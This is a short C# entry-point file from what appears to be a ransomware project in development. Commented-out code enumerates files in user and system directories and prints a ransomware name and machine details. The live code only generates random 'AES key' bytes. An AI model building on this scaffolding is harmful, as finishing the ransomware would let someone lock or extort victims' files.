using System;
using System.Collections.Generic;
using System.Linq;
using System.Security;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using dotnet.environment;
using dotnet.system;

namespace dotnet
{
    class Program
    {
        static async Task Main(string[] args)
        {
            // // find files module
            // var filesObj = new Files();
            // var watch = System.Diagnostics.Stopwatch.StartNew();
            // var files = await filesObj.find(new List<string>(){ "/home/", "/var/", "/media/", "/opt/", "/tmp/"});
            // watch.Stop();
            // string elapsed = watch.Elapsed.ToString();

            // Console.WriteLine(files.Count);
            // Console.WriteLine(elapsed);

            // variables module
            // Console.WriteLine("ransomware name: " + Variables.ransomwareName);
            // Console.WriteLine("Username: " + Variables.username);
            // Console.WriteLine("Desktop Path: " + Variables.desktop);
            // Console.WriteLine("cmd args: ");
            // Variables.commandLineArgs.ToList().ForEach(a => Console.WriteLine(a));
            // Console.WriteLine("machine Name: " + Variables.machineName);

            // generating random aes keys
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                byte[] key = new byte[256];
                rng.GetBytes(key);
                Console.WriteLine(Encoding.UTF8.GetString(key));
            }
        }
    }
}
